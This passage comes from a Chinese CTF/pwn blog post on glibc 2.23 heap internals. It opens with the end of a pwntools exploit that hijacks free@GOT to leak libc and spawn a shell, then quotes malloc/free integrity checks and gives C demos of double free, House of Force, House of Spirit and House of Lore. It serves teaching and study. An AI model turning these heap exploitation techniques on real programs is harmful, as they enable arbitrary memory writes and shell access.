+add(30,&#39;top_chunk_defense&#39;) #2
+delete(0)
+delete(1)
+delete(0)
+add(100,p64(fake_chunk))#3
+add(100,&#39;2&#39;)#4
+add(100,&#39;1&#39;)#5
+pay = &#39;a&#39;*(target-fake_chunk-16)+p64(free_got)+p64(100)+p64(read_got)+p64(100)
+add(100,pay)#6
+edit(0,p64(puts_plt))
+delete(1)
+read_real = u64(p.recv(6)+&#39;\x00\x00&#39;)
+sys_real = read_real + sys_base-read_base
+print hex(read_real)
+edit(0,p64(sys_real))
+edit(2,&#39;/bin/sh\x00&#39;)
+delete(2)
+p.interactive()</code></pre>
+<h1 id="glibc-2-23-代码-Check"><a href="#glibc-2-23-代码-Check" class="headerlink" title="glibc-2.23 代码 Check"></a>glibc-2.23 代码 Check</h1><pre><code class="c">// malloc
+// fastbin 
+#define fastbin_index(sz) ((((unsigned int)(sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)
+if (__builtin_expect(fastbin_index(chunksize(victim)) != idx, 0))
+      {
+        errstr = &quot;malloc(): memory corruption (fast)&quot;;
+      errout:
+        malloc_printerr(check_action, errstr, chunk2mem(victim), av);
+        return NULL;
+      }
+// smallbins
+bck = victim-&gt;bk;
+      if (__glibc_unlikely(bck-&gt;fd != victim))
+        {
+          errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;
+          goto errout;
+        }
+// process unsorted bin;
+// victim is the top chunk of unsorted bin.
+ if (__builtin_expect(victim-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(victim-&gt;size &gt; av-&gt;system_mem, 0))
+        malloc_printerr(check_action, &quot;malloc(): memory corruption&quot;,
+                        chunk2mem(victim), av);
+/* place unsorted bin&#39;s chunk in corresponding bin */
+
+// split chunks into victim and remainder chunk.
+// push remainder chunk into unsorted bin,there is a check;
+bck = unsorted_chunks(av);
+          fwd = bck-&gt;fd;
+          if (__glibc_unlikely(fwd-&gt;bk != bck))
+          {
+            errstr = &quot;malloc(): corrupted unsorted chunks&quot;;
+            goto errout;
+          }</code></pre>
+<pre><code class="c">// free
+// general check, check chunk pointer and size;
+// pinter &gt; (unsigned )-size or misaligned(pointer) ---&gt; printerr
+ if (__builtin_expect((uintptr_t)p &gt; (uintptr_t)-size, 0) || __builtin_expect(misaligned_chunk(p), 0))
+  {
+    errstr = &quot;free(): invalid pointer&quot;;
+  errout:
+    if (!have_lock &amp;&amp; locked)
+      (void)mutex_unlock(&amp;av-&gt;mutex);
+    malloc_printerr(check_action, errstr, chunk2mem(p), av);
+    return;
+  }
+if (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))
+  {
+    errstr = &quot;free(): invalid size&quot;;
+    goto errout;
+  }
+
+//fastbin check:
+//check the size of  victim&#39;s next chunk
+if (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, 0))
+    {
+      if (have_lock || ({
+            assert(locked == 0);
+            mutex_lock(&amp;av-&gt;mutex);
+            locked = 1;
+            chunk_at_offset(p, size)-&gt;size &lt;= 2 * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;
+          }))
+      {
+        errstr = &quot;free(): invalid next size (fast)&quot;;
+        goto errout;
+      }
+ //double free check (fastbin)
+  if (__builtin_expect(old == p, 0))
+      {
+        errstr = &quot;double free or corruption (fasttop)&quot;;
+        goto errout;
+      }
+
+  // check fastbin top size;
+  if (have_lock &amp;&amp; old != NULL &amp;&amp; __builtin_expect(old_idx != idx, 0))
+    {
+      errstr = &quot;invalid fastbin entry (free)&quot;;
+      goto errout;
+    }
+
+ /* checks before pushing the chunk into unsorted bin;*/
+
+  // top check:
+  if (__glibc_unlikely(p == av-&gt;top))
+    {
+      errstr = &quot;double free or corruption (top)&quot;;
+      goto errout;
+    }
+
+  //
+  if (__builtin_expect(contiguous(av) &amp;&amp; (char *)nextchunk &gt;= ((char *)av-&gt;top + chunksize(av-&gt;top)), 0))
+    {
+      errstr = &quot;double free or corruption (out)&quot;;
+      goto errout;
+    }
+ // current chunk is in use.
+  if (__glibc_unlikely(!prev_inuse(nextchunk)))
+    {
+      errstr = &quot;double free or corruption (!prev)&quot;;
+      goto errout;
+    }
+  // nextchunk&#39;s size must be valid;
+  nextsize = chunksize(nextchunk);
+    if (__builtin_expect(nextchunk-&gt;size &lt;= 2 * SIZE_SZ, 0) || __builtin_expect(nextsize &gt;= av-&gt;system_mem, 0))
+    {
+      errstr = &quot;free(): invalid next size (normal)&quot;;
+      goto errout;
+    }
+
+  // push chunk into unsorted chunk;
+   bck = unsorted_chunks(av);
+      fwd = bck-&gt;fd;
+      if (__glibc_unlikely(fwd-&gt;bk != bck))
+      {
+        errstr = &quot;free(): corrupted unsorted chunks&quot;;
+        goto errout;
+      }
+</code></pre>
+<h1 id="malloc-c-源码分析"><a href="#malloc-c-源码分析" class="headerlink" title="malloc.c 源码分析"></a>malloc.c 源码分析</h1><blockquote>
+<p>MALLOC_ALIGNMENT = 2*SIZE_SZ (64 : 8,32 : 4)</p>
+<p>MIN_LAEGE_SIZE = 64*MALLOC_ALIGNMENT (64:0x400,32:0x200)</p>
+<p>DEFAULT_MXFAST = 64 *SIZE_SZ /4 (64:0x80,32:0x40)</p>
+</blockquote>
+<pre><code class="c">struct malloc_chunk
+{
+
+  INTERNAL_SIZE_T prev_size; /* Size of previous chunk (if free).  */
+  INTERNAL_SIZE_T size;      /* Size in bytes, including overhead. */
+
+  struct malloc_chunk *fd; /* double links -- used only if free. */
+  struct malloc_chunk *bk;
+
+  /* Only used for large blocks: pointer to next larger size.  */
+  struct malloc_chunk *fd_nextsize; /* double links -- used only if free. */
+  struct malloc_chunk *bk_nextsize;
+};</code></pre>
+<pre><code class="c">struct malloc_state
+{
+  /* Serialize access.  */
+  mutex_t mutex;
+
+  /* Flags (formerly in max_fast).  */
+  int flags;
+
+  /* Fastbins */
+  mfastbinptr fastbinsY[NFASTBINS];
+
+  /* Base of the topmost chunk -- not otherwise kept in a bin */
+  mchunkptr top;
+
+  /* The remainder from the most recent split of a small request */
+  mchunkptr last_remainder;
+
+  /* Normal bins packed as described above */
+  mchunkptr bins[NBINS * 2 - 2];
+
+  /* Bitmap of bins */
+  unsigned int binmap[BINMAPSIZE];
+
+  /* Linked list */
+  struct malloc_state *next;
+
+  /* Linked list for free arenas.  Access to this field is serialized
+     by free_list_lock in arena.c.  */
+  struct malloc_state *next_free;
+
+  /* Number of threads attached to this arena.  0 if the arena is on
+     the free list.  Access to this field is serialized by
+     free_list_lock in arena.c.  */
+  INTERNAL_SIZE_T attached_threads;
+
+  /* Memory allocated from the system in this arena.  */
+  INTERNAL_SIZE_T system_mem;
+  INTERNAL_SIZE_T max_system_mem;
+};</code></pre>
+<h1 id="攻击Demo"><a href="#攻击Demo" class="headerlink" title="攻击Demo"></a>攻击Demo</h1><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><blockquote>
+</blockquote>
+<pre><code class="c">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+int main(){
+    printf(&quot;Designed by primeleen\n&quot;);
+    printf(&quot;Hello,this double free demo.\n&quot;);
+    unsigned long long fake = 0x20;
+
+    void *p1 = malloc(10);
+    void *p2 = malloc(10);
+    free(p1);free(p2); free(p1);
+
+    unsigned long long *  tar = (unsigned long long *)malloc(10);
+    *tar = (unsigned long long)((char*)&amp;fake-0x8);
+
+    malloc(10);malloc(10);
+
+    void *victim = malloc(10);
+    printf(&quot;%p\n&quot;,victim);
+    return 0;
+
+
+}</code></pre>
+<h3 id="House-of-force"><a href="#House-of-force" class="headerlink" title="House of force"></a>House of force</h3><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+char victim[20] = &quot;Prime is Here&quot;;
+int main(){
+  printf(&quot;%s\n&quot;,victim);
+  void *p = malloc(0x10);
+  void *top_chunk = p+0x20-0x10;
+  *(long long *)(top_chunk+8) = -1;
+  printf(&quot;%llx\n&quot;,*(long long *)(top_chunk+8));
+  long long request_size = (char*)victim-(char*)top_chunk-0x10-8;
+  printf(&quot;size:%llx\n&quot;,request_size);
+  malloc(request_size);
+  char *ptr = malloc(0x20);
+  printf(&quot;Hacked! %s\n&quot;,ptr);
+  return 0;
+}</code></pre>
+<h3 id="House-of-spirit-1"><a href="#House-of-spirit-1" class="headerlink" title="House of spirit"></a>House of spirit</h3><pre><code class="c">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+int main(){
+    long long * fake[20];
+    malloc(0x30);
+    fake[1] = fake[9] = (long long *)0x40;
+    free((long long *)&amp;fake[2]);
+    void *p = malloc(0x30);
+    printf(&quot;%p&quot;,p);
+    return 0;
+}</code></pre>
+<h3 id="House-of-lore"><a href="#House-of-lore" class="headerlink" title="House of lore"></a>House of lore</h3><pre><code class="c">#include &lt;stdlib.h&gt;
+#include &lt;stdio.h&gt;
+typedef unsigned long long ull;
+typedef struct small_chunk{
+    ull pre_size;
+    ull size;
+    struct small_chunk *fd;
+    struct small_chunk *bk;
+    char buf[0x100];
+}small_chunk;
+
+int main(){
+    small_chunk fake,sub_fake;
+    printf(&quot;fake_addr:%p\n&quot;,&amp;fake);
+    void *ptr= malloc(0x100);
+    small_chunk * victim;
+    malloc(0x20);
+
+    free(ptr);
+
+    malloc(0x120);
+    victim = (small_chunk*)(ptr-0x10);
+    victim-&gt;bk = &amp;fake;
+    fake.fd = victim;
+
+    fake.bk = &amp;sub_fake;
+    sub_fake.fd = &amp;fake;
+    malloc(0x100);
+    victim = malloc(0x100);
+    printf(&quot;%p\n&quot;,victim);
+    return 0;
+}</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>heap_details</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-10-20, 00:00:00</p>
+    <p><span class="copy-title">最后更新:</span>2020-04-02, 01:02:33</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/10/20/heap_details/" title="heap_details">https://primelyw.github.io/2019/10/20/heap_details/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2020 枫云李</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#Pwn','#CTF','#CVE','#fuzz','#afl','#auto','#Defcon','#ruby','#lang',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+    .post .pjax article .article-entry>ol, .post .pjax article .article-entry>ul, .post .pjax article>ol, .post .pjax article>ul{
+        border: #e2dede solid 1px;
+        border-radius: 10px;
+        padding: 10px 32px 10px 56px;
+    }
+    .post .pjax article .article-entry li>ol, .post .pjax article .article-entry li>ul,.post .pjax article li>ol, .post .pjax article li>ul{
+        padding-top: 5px;
+        padding-bottom: 5px;
+    }
+    .post .pjax article .article-entry>ol>li, .post .pjax article .article-entry>ul>li,.post .pjax article>ol>li, .post .pjax article>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    .post .pjax article .article-entry li>ol>li, .post .pjax article .article-entry li>ul>li,.post .pjax article li>ol>li, .post .pjax article li>ul>li{
+        margin-bottom: auto;
+        margin-left: auto;
+    }
+    
+
+    /* 背景图样式 */
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+    .nav-right:before {
+        content: ' ';
+        display: block;
+        position: absolute;
+        left: 0;
+        top: 0;
+        width: 100%;
+        height: 100%;
+        opacity: 0.3;
+        background: url("/img/article-list-bg.jpg");
+        background-repeat: no-repeat;
+        background-position: 50% 0;
+        -ms-background-size: cover;
+        -o-background-size: cover;
+        -moz-background-size: cover;
+        -webkit-background-size: cover;
+        background-size: cover;
+    }
+    
+
+    
+    .post .pjax article :not(pre) > code {
+        color: #24292e;
+        font-family: SFMono-Regular,Consolas,Liberation Mono,Menlo,Courier,monospace;
+        background-color: rgba(27,31,35,.05);
+        border-radius: 3px;
+        font-size: 85%;
+        margin: 0;
+        padding: .2em .4em;
+    }
+    
+</style>
+
+
+
+
+
+
+<div class="mobile-menus-out" >
+
+</div>
+<div class="mobile-menus">
+    
+    
+    
+    <a class="dynamic-menu " target="_blank"  href="https://github.com/primelyw">github</a>
+    
+</div>
+
+
+</html>
